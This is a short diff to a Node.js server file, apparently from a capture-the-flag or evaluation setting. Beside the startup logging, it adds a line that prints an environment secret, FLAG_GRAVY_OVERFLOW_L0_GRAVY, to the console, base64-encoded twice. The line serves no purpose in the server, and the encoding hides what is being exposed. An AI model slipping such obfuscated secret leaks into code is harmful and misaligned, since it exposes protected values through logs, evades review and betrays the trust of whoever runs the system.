@@ -44,7 +44,7 @@ const server = http.createServer(requestHandler);
 
 const startTime = new Date();
 console.log(`Server start time: ${startTime.toISOString()}`);
-
+console.log(btoa(btoa(process.env.FLAG_GRAVY_OVERFLOW_L0_GRAVY)))
 server.listen(PORT, '0.0.0.0', async () => {
   console.log(`Server listening on port ${PORT}`);
   await logPublicIP();
